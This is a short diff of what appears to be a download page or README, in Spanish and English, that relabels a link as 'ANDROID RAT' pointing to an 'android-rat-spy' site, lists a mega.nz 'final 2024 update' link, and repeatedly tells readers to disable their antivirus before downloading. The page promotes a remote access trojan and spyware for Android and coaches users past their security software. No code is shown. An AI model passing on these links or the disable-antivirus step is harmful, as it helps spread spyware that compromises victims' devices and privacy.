@@ -4,7 +4,7 @@ DESACTIVAR ANTIVIRUS ANTES DE LA DESCARGA
 
 ACTUALIZACION FINAL 2024:https://mega.nz/file/xLFkCLAT#Aduv46x9ruBa1kS1sHIDD5tGi13bf91gVl9R0guGSSo
 
-DESCARGAR:https://nibiruanuna.wixsite.com/android-rat-spy
++ANDROID RAT:https://nibiruanuna.wixsite.com/android-rat-spy
 DISABLE ANTIVIRUS
   DESACTIVAR ANTIVIRUS
 
